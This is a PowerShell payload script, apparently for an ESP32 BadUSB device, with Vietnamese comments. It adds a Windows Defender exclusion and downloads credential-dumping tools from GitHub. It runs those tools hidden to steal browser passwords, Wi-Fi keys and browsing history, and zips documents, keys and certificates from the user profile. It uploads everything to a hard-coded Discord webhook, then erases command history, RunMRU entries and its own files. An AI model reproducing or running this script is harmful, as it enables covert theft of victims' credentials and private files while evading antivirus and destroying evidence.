#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        

$basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# Download necessary tools
$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
Invoke-WebRequest $zipUrl -OutFile "tools.zip"

# Giải nén ngay lập tức
Expand-Archive -Path "tools.zip" -DestinationPath "." -Force

# CHẠY ĐA LUỒNG: Kích hoạt 4 công cụ quét cùng một lúc
Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden

# Wait for the files to be fully written
while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
    Start-Sleep -Milliseconds 100
}

Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"

# Compress extracted data
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Milliseconds 100
}

# ============================================
# GỬI QUA DISCORD (giữ nguyên code gốc)
# ============================================

$dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
$hookurl = "$dc"
if ($hookurl.Length -lt 120){
    $hookurl = ("https://discord.com/api/webhooks/" + "$dc")
}

# Ẩn cửa sổ console
$hide = 'y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}

Function FindAndSend {
    param ([string[]]$FileType,[string[]]$Path)
    $maxZipFileSize = 10MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath ="$env:temp/Loot$index.zip"
    
    #Neu kh co duong dan thi se quet het
    $Path = "DownLoads"
    If($Path -ne $null){
        $foldersToSearch = "$env:USERPROFILE\"+$Path
    }else{
        $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
    }
    
    If($FileType -ne $null){
        $fileExtensions = "*."+$FileType
    }else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    curl.exe -F file1=@"$zipFilePath" $hookurl
                    Remove-Item -Path $zipFilePath -Force
                    Sleep 1
                    $index++
                    $zipFilePath ="$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
    $zipArchive.Dispose()
    curl.exe -F file1=@"$zipFilePath" $hookurl
    Remove-Item -Path $zipFilePath -Force
    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

FindAndSend

# ============================================
# DỌN DẸP DẤU VẾT (giữ nguyên code gốc)
# ============================================

Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
} catch {}

Set-Location "C:\"
Remove-Item -Path $basePath -Recurse -Force
Remove-MpPreference -ExclusionPath $basePath -Force

Stop-Process -Id $PID -Force
